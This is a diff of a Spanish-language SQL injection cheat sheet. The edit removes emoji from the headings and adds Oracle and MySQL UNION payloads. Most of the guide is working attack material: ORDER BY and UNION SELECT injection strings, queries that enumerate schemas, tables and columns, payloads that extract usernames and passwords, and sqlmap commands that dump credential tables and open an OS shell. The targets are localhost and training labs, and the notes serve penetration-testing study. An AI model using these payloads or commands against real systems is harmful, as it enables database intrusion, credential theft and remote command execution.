@@ -4,13 +4,13 @@
 
 ---
 ---
-#### 📝 **¿Qué es SQL Injection?**  
+#### **¿Qué es SQL Injection?**  
 La **inyección SQL (SQLi)** es una vulnerabilidad que permite al atacante manipular consultas SQL realizadas por la aplicación para acceder o modificar datos de la base de datos.  
 El atacante puede enviar consultas maliciosas a través de parámetros de entrada, explotando así la aplicación vulnerable.  
 
 ---
 
-## 🔍 **Fase 1: Descubrimiento de Columnas con `ORDER BY`**  
+## **Fase 1: Descubrimiento de Columnas con `ORDER BY`**  
 
 Para determinar el número de columnas en la consulta SQL, se usa la cláusula **`ORDER BY`**:  
 ```sql
@@ -22,19 +22,30 @@ id=3' order by 100-- -
 
 ---
 
-## 🔗 **Fase 2: Exploración con `UNION SELECT`**  
+## **Fase 2: Exploración con `UNION SELECT`**  
 
 Una vez conocida la cantidad de columnas, intentamos combinar los resultados de la consulta original con los nuestros:  
+**MySQL y Microsoft**
 ```sql
-id=3' union select 1--
+id=3' union select 1--+-
+id=3' union select NULL,2,@@version--+-
+
+```
+**Oracle**
+```sql
+
+id=3' union select NULL,NULL FROM DUAL-- 
+id=3' union select 'a','b' FROM DUAL-- 
+id=3' union select 'a',banner from v$version--
 ```
 Esto debería mostrar el valor `1` en la columna inyectada si la consulta es exitosa.  
 
 ---
 
-## 🗃️ **Fase 3: Enumeración de Bases de Datos**  
+## **Fase 3: Enumeración de Bases de Datos**  
 
 Para listar todas las bases de datos:  
+**MySQL**
 ```sql
 id=32' union select schema_name from information_schema.schemata-- -
 ```
@@ -44,7 +55,7 @@ id=32' union select schema_name from information_schema.schemata-- -
 
 ---
 
-## 📝 **Concatenación con `group_concat()`**  
+## **Concatenación con `group_concat()`**  
 Si el resultado está limitado, usamos la función **`group_concat()`**:  
 ```sql
 id=32' union select group_concat(schema_name) from information_schema.schemata-- -
@@ -56,7 +67,7 @@ id=32' union select schema_name from information_schema.schemata limit 0,1-- -
 
 ---
 
-## 🗂️ **Fase 4: Enumeración de Tablas**  
+## **Fase 4: Enumeración de Tablas**  
 
 Para listar todas las tablas dentro de una base de datos:  
 ```sql
@@ -65,7 +76,7 @@ id=32' union select group_concat(table_name) from information_schema.tables wher
 
 ---
 
-## 🧱 **Fase 5: Enumeración de Columnas**  
+## **Fase 5: Enumeración de Columnas**  
 
 Para listar todas las columnas dentro de una tabla específica:  
 ```sql
@@ -74,7 +85,7 @@ id=32' union select group_concat(column_name) from information_schema.columns wh
 
 ---
 
-## 🔑 **Fase 6: Extracción de Datos**  
+## **Fase 6: Extracción de Datos**  
 
 Obtener los usuarios almacenados:  
 ```sql
@@ -84,11 +95,12 @@ id=32' union select group_concat(username) from users-- -
 Obtener usuarios y contraseñas en conjunto:  
 ```sql
 id=32' union select group_concat(username,':',password) from users-- -
+id=32' union select NULL,group_concat(category,0x3a,name) from academy_labs.products-- 
 ```
 
 ---
 
-## 📝 **Aclaraciones Importantes**  
+## **Aclaraciones Importantes**  
 
 - **ORDER BY:** El número representa el total de columnas. Ejemplo:  
   ```sql
@@ -109,36 +121,36 @@ id=32' union select group_concat(username,':',password) from users-- -
 
 ---
 
-## 🛠️ **Automatización con SQLMap**  
+## **Automatización con SQLMap**  
 
-### 🔎 **Enumeración de Bases de Datos:**
+### **Enumeración de Bases de Datos:**
 ```bash
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbs --cookie "PHPSESSID=8123791283"
 ```
 
-### 🗃️ **Listar Tablas de una Base de Datos:**
+### **Listar Tablas de una Base de Datos:**
 ```bash
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u --tables
 ```
 
-### 📝 **Listar Columnas de una Tabla:**
+### **Listar Columnas de una Tabla:**
 ```bash
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u -T users --columns
 ```
 
-### 🔐 **Dumpear Información Sensible:**
+### **Dumpear Información Sensible:**
 ```bash
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u -T users -C username,password --dump
 ```
 
-### 🖥️ **Obtener Shell Remota:**
+### **Obtener Shell Remota:**
 ```bash
 sqlmap -u 'http://localhost/searchUsers.php?id=1' --os-shell
 ```
 
 ---
 
-## ⚙️ **Parámetros Útiles de SQLMap**
+## **Parámetros Útiles de SQLMap**
 | Parámetro    | Descripción                                                         |
 |-------------|---------------------------------------------------------------------|
 | `--dbs`     | Lista todas las bases de datos.                                      |
